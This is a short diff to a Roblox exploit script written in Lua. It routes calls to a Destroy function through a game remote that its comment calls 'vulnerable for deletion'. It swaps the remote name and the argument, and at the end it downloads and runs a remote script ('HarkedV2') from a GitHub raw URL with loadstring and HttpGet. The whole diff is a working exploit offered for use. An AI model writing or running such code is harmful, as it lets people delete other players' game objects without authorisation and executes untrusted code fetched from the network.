@@ -7,7 +7,7 @@ local function Destroy(a: Instance)
     local _G = getgenv()
 
     local args = { -- Change the arguments depending on how the remote works.
-        [1] = "wear"
+        [1] = "Destroy",
         [2] = a
     }
     
@@ -20,7 +20,7 @@ local function Destroy(a: Instance)
     end
 end
 
-getgenv().rem = game.ReplicatedStorage.RE["1Updat1eAvata1r"] -- Change this to whatever remote is vulnerable for deletion
+getgenv().rem = game.ReplicatedStorage.Remotes["DeleteRemoteExample"] -- Change this to whatever remote is vulnerable for deletion
 getgenv().Destroy = Destroy
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/qtip-rbxl/HarkedV2/main/main.lua", true))()
